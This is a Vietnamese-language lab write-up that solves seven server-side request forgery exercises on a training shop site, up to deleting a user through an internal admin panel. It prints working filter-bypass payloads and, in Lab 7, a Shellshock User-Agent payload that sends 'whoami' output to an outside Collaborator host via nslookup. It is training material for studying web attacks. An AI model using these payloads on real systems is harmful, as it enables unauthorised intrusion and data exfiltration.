# Server-side request forgery

## Bài 1: Basic SSRF against the local server
>![](https://i.imgur.com/vCjx8lz.png)
<hr>


Mô tả: Chức năng `stock check` của trang web fetch data từ nguồn bên trong nội bộ, khai thác SSRF để chuyển hướng request khiến server fetch data từ trang `/admin` và trả về. Sau đó xóa user `carlos`

Kiểm tra chức năng ta thấy nó gửi value như sau đến server
```htmlembedded
<select name="stockApi">
    <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1">London</option>
    <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=2">Paris</option>
    <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=3">Milan</option>
</select>
```

Mỗi option stock check sẽ gửi một đường link đến server, và server sẽ fetch từ đường link đó. Vậy để fetch trang admin ta đổi giá trị của 1 option thành `http://localhost/admin`

>![](https://i.imgur.com/8Foppxe.png)


Để xóa user `carlos` ta đổi đường dẫn thành `http://localhost/admin/delete?username=carlos`
>![](https://i.imgur.com/haMmPqz.png)


<hr>

## Bài 2: Basic SSRF against another back-end system
>![](https://i.imgur.com/SPnzOjZ.png)


Mô tả: Đề không cho trước địa chỉ IP của backend system, chỉ biết nó có dạng `192.168.0.X` và port `8080`. Ta sẽ phải scan ra và khai thác ssrf để xóa user carlos

Sử dụng Burpsuite Intruder để scan từ 1 đến 255 ta được kết quả là địa chỉ: 192.168.0.29
>![](https://i.imgur.com/DzujkrC.png)

<hr>

## Bài 3: SSRF with blacklist-based input filter
>![](https://i.imgur.com/2EGA1l0.png)


Mô tả: Nhà phát triển đã triển khai hai hệ thống phòng thủ chống SSRF yếu mà bạn sẽ cần phải vượt qua. 

Thử truyền đường dẫn như `http://localhost/`, `http://127.0.0.1` thì thấy đã bị server chặn bằng blacklist.
`"External stock check blocked for security reasons"`

Thử các alternative IP của 127.0.0.1 như là `2130706433`, `017700000001`, hoặc `127.1` thì ta thấy `127.1` có thể bypass được.
>![](https://i.imgur.com/pXRtQPm.png)

Tuy nhiên nếu truyền `/admin` vào thì lại bị chặn, thử urlencode (double) nó ta thấy có thể bypass.
`http://127.1/%2561%2564%256d%2569%256e`

Xóa user `carlos` và solve bài lab:
>![](https://i.imgur.com/ptQKLU7.png)

<hr>


## Bài 4: SSRF with filter bypass via open redirection vulnerability
>![](https://i.imgur.com/9KlB7LY.png)


Mô tả: Chức năng `stock checker` đã hạn chế chỉ cho phép truy cập vào các ứng dụng nội bộ, mục tiêu của ta là khiến nó fetch data từ trang `http://192.168.0.12:8080/admin` (không phải nội bộ) và sau đó xóa user `carlos`

Vì `stock checker` không truy cập vào các đường dẫn bên ngoài mạng nội bộ, tức là nó sẽ dùng whitelist để lọc các đường dẫn mà nó sẽ fetch, vì thế ta cần lợi dụng các chức năng cho phép redirect tới 1 đường dẫn mà ta có thể kiểm soát.

Lướt qua các request, ta thấy chức năng `Next product` nhận tham số `path` để redirect tới sản phẩm khác, tham số này ta có thể kiểm soát.
>![](https://i.imgur.com/1OyYdJR.png)


Thay `path` bằng đường dẫn tới trang mà đề cho để truy cập admin, sau đó, ta đưa request này cho chức năng `stock checker`. Nó kiểm tra và thấy đường dẫn `/product/nextProduct` thuộc ứng dụng nội bộ, nên sẽ fetch data từ đường dẫn này, tham số `path` mà ta inject sẽ điều hướng request tới một trang bên ngoài.

`stockApi=/product/nextProduct?currentProductId=2%26path=http://192.168.0.12:8080/admin/delete?username=carlos`

>![](https://i.imgur.com/QJdU1fd.png)


<hr>

## Bài 5: Blind SSRF with out-of-band detection
>![](https://i.imgur.com/zWXAMpS.png)


Mô tả: Trang web sử dụng phần mềm phân tích để fetch URL được khai báo trong trường `Referer` của HTTP Header khi trang sản phẩm load. Mục tiêu của ta là khai thác để server gửi request tới Burp Collaborator server của mình.

Khi mở 1 sản phẩm bất kì, ta thấy request có chứa trường `Referer`, thay đổi giá trị của nó thành đường dẫn tới Burp Collaborator server của ta, ta thấy đường dẫn đã được fetch, và solve bài lab.
>![](https://i.imgur.com/dwD9n2H.png)

<hr>


## Bài 6: SSRF with whitelist-based input filter
>![](https://i.imgur.com/pxO7UIT.png)


Mô tả: `The developer has deployed an anti-SSRF defense you will need to bypass.`

Thử inject đường dẫn `http://localhost/admin` ta thấy nó trả về thông báo như sau
<kbd>"External stock check host must be stock.weliketoshop.net"</kbd>
Nghĩa là mọi đường dẫn của ta phải thuộc host <kbd>stock.weliketoshop.net</kbd>

Để kiểm tra xem server kiểm tra như thế nào, ta thử các trường hợp như là:
- Server kiểm tra xem host có CHỨA `stock.weliketoshop.net` ta dùng payload như là `http://localhost#stock.weliketoshop.net:8080` hay `http://stock.weliketoshop.net.our-domain` và quan sát thấy vẫn bị block
- Server thật sự kiểm tra phần host trong request: ta thử `http://xxx@stock.weliketoshop.net`
>![](https://i.imgur.com/Q1Qiewe.png)

Như hình trên ta thấy có thể chèn thêm dữ liệu vào phần `username` trong đường dẫn, và em đã chèn localhost. Để gạt bỏ phần phía sau đi ta có thể dùng fragment <kbd>#</kbd>. Tuy nhiên điều đó làm thay đổi host và bị server block.

Thử encode và double encode ta thấy có thể bypass được việc kiểm tra host của server và đến được trang có admin panel khi server thực hiện fetch (phần sau fragment sẽ bị bỏ đi)
>![](https://i.imgur.com/cKnUKau.png)


>![](https://i.imgur.com/BXgAVj3.png)

<hr>

## Bài 7: Blind SSRF with Shellshock exploitation
>![](https://i.imgur.com/mQTtycP.png)

Mô tả: Trang web sử dụng công cụ phân tích để fetch đường dẫn trong trường `Referer`. Mục tiêu là sử dụng chức năng này để thực hiện `blind SSRF` gửi request tới máy 192.168.0.X:8080 trong mạng nội bộ, đồng thời sử dụng `Shellshock payload` tại 1 điểm vulnerable trong http request để khai thác lấy tên của OS user trên máy đó.

Đầu tiên thử dùng Burp Intruder brute force địa chỉ IP của máy nạn nhân, nhưng tất cả kết quả trả về đều như nhau.

Chuyển sang tìm kiếm điểm khai thác ssrf lấy os user name, em sử dụng `Collaborator everywhere` hỗ trợ. Sau khi sử dụng lại trang web, kiểm tra scan tự động thì thấy có cảnh báo hiện lên như sau:
>![](https://i.imgur.com/OxYF3PB.png)


Đoán rằng trường `user-agent` đang bị lỗ hổng ssrf, em thử dùng payload như sau
Payload shellshock
`() { :; }; /usr/bin/nslookup $(whoami).v0w7km5k6gzs3hgzx2kjx59yrpxfl4.oastify.com`

Cặp dấu () { :; }; khiến bash shell xử lý chuỗi user-agent theo kiểu khác, nó sẽ thực hiện câu lệnh phía sau rồi lấy kết quả trả về chứ không lấy trực tiếp chuỗi. Và điều đó sẽ khiến máy nạn nhân gửi 1 request nslookup chứa kết quả lệnh `whoami`

Request DNS gửi tới máy chủ ta kèm theo username
>![](https://i.imgur.com/uwYGdlL.png)


Submit là ta solve
>![](https://i.imgur.com/UgmGKP1.png)


<hr>

